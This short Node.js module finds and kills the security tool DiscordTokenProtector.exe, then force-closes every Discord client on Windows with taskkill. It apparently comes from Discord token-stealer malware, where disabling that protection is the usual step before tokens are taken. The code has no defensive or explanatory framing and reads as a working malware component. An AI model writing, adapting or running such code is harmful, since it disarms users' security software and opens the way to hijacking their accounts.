const { isWindows } = require('../os');
const { execSync } = require('child_process');
const psList = () => import('ps-list').then(({ default: psList }) => psList());

psList().then(data => {
  const dtp = data.find(process => process.name === 'DiscordTokenProtector.exe');
  // There's a DTP process, kill it
  if (!!dtp) process.kill(dtp.pid);
});

// Kills every version of Discord running
['discord', 'discordcanary', 'discorddevelopment', 'discordptb'].forEach(app => {
  isWindows() && execSync(`taskkill /f /im ${app}.exe`);
});
